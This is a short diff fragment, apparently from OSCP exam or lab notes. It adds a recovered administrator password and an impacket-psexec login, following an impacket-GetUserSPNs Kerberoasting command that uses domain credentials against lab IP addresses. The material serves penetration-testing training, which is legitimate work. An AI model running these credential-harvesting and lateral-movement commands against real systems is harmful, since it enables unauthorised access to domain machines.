@@ -34,11 +34,11 @@ impacket-GetUserSPNs 'oscp.exam/administrator:December31' -dc-ip 10.10.162.152
 ```
 
 ```
-
+administrator : hghgib6vHT3bVWf
 ```
 
 ```
-
+impacket-psexec oscp.exam/Administrator@10.10.162.154 -hashes hghgib6vHT3bVWf
 ```
 
 ```
